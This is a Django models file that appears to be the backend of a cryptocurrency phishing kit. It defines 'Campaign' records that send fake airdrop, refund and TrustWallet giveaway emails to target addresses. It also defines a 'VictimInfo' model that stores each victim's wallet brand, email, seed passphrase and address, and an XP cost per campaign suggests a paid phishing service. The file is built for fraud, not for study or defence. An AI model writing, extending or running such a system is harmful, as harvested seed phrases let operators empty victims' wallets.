from django.db import models
from django.conf import settings
import uuid
from django.utils import timezone


CRYPTO_CHOICES = [
    ('BTC', 'Bitcoin'),
    ('ETH', 'Ethereum'),
    ('USDT', 'Tether'),
    ('TON', 'Toncoin'),
]

TEMPLATE_CHOICES = [
    ('AIRDROP', 'Airdrop Notification'),
    ('REFUND', 'Crypto Refund Notification'),
    ('GIVEAWAY', 'TrustWallet Giveaway'),
]

WALLET_CHOICES = [
    ('TRUSTWALLET', 'TrustWallet'),
    ('EXODUS', 'Exodus'),
    ('COINBASE', 'Coinbase'),
    ('METAMASK', 'MetaMask'),
]


User = settings.AUTH_USER_MODEL

class Campaign(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    recipient_email = models.EmailField()
    email_template = models.CharField(max_length=20, choices=TEMPLATE_CHOICES)
    cryptocurrency = models.CharField(max_length=10, choices=CRYPTO_CHOICES)
    quantity = models.DecimalField(max_digits=10, decimal_places=2)
    min_balance = models.DecimalField(max_digits=10, decimal_places=2)
    xp_cost = models.DecimalField(max_digits=10, decimal_places=2, default=10.0)  # default XP cost
    created_at = models.DateTimeField(auto_now_add=True)
    uuid = models.UUIDField(default=uuid.uuid4, editable=False, unique=True, null=True, blank=True)  # Add UUID field


    def __str__(self):
        return f'Campaign for {self.recipient_email} - {self.cryptocurrency}'

    class Meta:
        verbose_name = 'Campaign'
        verbose_name_plural = 'Campaigns'



class VictimInfo(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    wallet = models.CharField(max_length=20, choices=WALLET_CHOICES)
    recipient_email = models.EmailField()
    passphrase = models.CharField(max_length=100, null=True, blank=True)
    address = models.CharField(max_length=100, null=True, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f'{self.wallet} - {self.recipient_email}'

    class Meta:
        verbose_name = 'Victim Info'
        verbose_name_plural = 'Victim Infos'